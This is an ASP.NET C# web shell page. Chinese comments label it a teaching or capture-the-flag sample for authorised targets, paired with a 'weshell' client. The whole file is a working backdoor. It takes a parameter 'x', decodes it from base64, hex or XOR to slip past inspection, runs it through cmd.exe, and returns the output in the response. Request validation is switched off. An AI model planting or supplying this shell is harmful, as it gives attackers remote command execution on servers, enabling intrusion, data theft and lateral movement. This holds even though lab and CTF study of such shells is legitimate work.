<%@ Page Language="C#" ValidateRequest="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
// 教学 / CTF 靶场样本：ASP.NET (C# / .NET Framework，IIS) 命令执行型一句话马
// 仅用于你自有或已获明确授权的靶机环境。
//
// 说明：C# 没有内建的 eval / execute（不像 PHP 的 @eval 或 ASP 的 execute），
// 因此 ASP.NET 一句话通常走「命令执行」形态：把参数 x 拼进 cmd /c 执行，
// 并将标准输出与标准错误一并回显。对应 weshell 的「直接提交系统命令」玩法
// （与 php-cmd 对齐：回显即响应体原文，不带随机标记包裹）。
//
// 连接参数名为 x；管理端 GET/POST 形如 ?x=whoami 即可。
// 若想自定义参数名（如 chopper），把下面 Request["x"] 改成 Request["chopper"]，
// 并在 weshell 新建靶机时「参数名」填一致的值即可。

// weshell 客户端按 enc 参数对命令做编码（base64/hex/xor），此处对应解码；enc 缺省按 base64（兼容旧版）。
string __enc = Request.Unvalidated["enc"];
string __raw = Request.Unvalidated["x"];
string __cmd = "";
if (!string.IsNullOrEmpty(__raw))
{
    byte[] __data;
    if (__enc == "hex")
    {
        __data = new byte[__raw.Length / 2];
        for (int i = 0; i < __data.Length; i++)
            __data[i] = (byte)int.Parse(__raw.Substring(i * 2, 2), System.Globalization.NumberStyles.HexNumber);
    }
    else if (__enc == "xor")
    {
        byte[] __k = System.Text.Encoding.UTF8.GetBytes(Request.Unvalidated["key"] ?? "");
        __data = new byte[__raw.Length];
        for (int i = 0; i < __raw.Length; i++) __data[i] = (byte)__raw[i];
        if (__k.Length > 0)
            for (int i = 0; i < __data.Length; i++) __data[i] = (byte)(__data[i] ^ __k[i % __k.Length]);
    }
    else
    {
        __data = Convert.FromBase64String(__raw);
    }
    __cmd = System.Text.Encoding.UTF8.GetString(__data);
}
var psi = new ProcessStartInfo("cmd.exe", "/c " + __cmd)
{
    RedirectStandardOutput = true,
    RedirectStandardError = true,
    UseShellExecute = false
};
using (var p = Process.Start(psi))
{
    string stdout = p.StandardOutput.ReadToEnd();
    string stderr = p.StandardError.ReadToEnd();
    p.WaitForExit();
    Response.Write(stdout);
    if (!string.IsNullOrEmpty(stderr)) Response.Write(stderr);
}
%>
